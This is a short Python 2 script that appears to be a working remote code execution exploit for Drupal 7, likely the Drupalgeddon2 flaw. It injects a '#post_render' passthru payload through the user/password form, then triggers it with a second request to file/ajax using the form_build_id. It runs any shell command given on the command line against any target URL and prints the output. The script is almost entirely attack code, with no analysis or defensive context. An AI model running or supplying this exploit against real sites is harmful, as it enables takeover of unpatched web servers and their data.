#!/usr/bin/env python2

from random import choice
from BeautifulSoup import BeautifulSoup as Soup
import requests
import base64
import sys

def drupal7( target, cmd ):
    try:
        url = ""
        url += target
        url += "/?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]="
        url += cmd
        post = { "form_id" : "user_pass", "_triggering_element_name" : "name" }
        response = requests.post( url, data=post, verify=False )
        if response.status_code == 200:
            soup = Soup( response.content )
            form_build_id = soup.find( "input", { "name" : "form_build_id" } )["value"]
            url = ""
            url += target
            url += "/?q=file/ajax/name/%23value/"
            url += form_build_id
            post = { "form_build_id" : form_build_id }
            response = requests.post( url, data=post, verify=False )
            if response.status_code == 200 and serial in response.content:
                return response.content.split( "\n" )[0]
    except Exception as ERROR:
        return None

if __name__ == "__main__":
    target = sys.argv[1]
    serial = ""
    while ( len( serial ) < 9 ):
        serial += choice( [ x for x in "abcdefghijklmnopqrstuvwxyz" ] )
    cmd = 'echo "[{}] $({})"'.format( serial, sys.argv[2] )
    output = drupal7( target, cmd )
    if output is not None:
        print "[+] Exploit successful: {}".format( output.split( "] " )[1] ) 
    else:
        print "[!] Exploit failed"
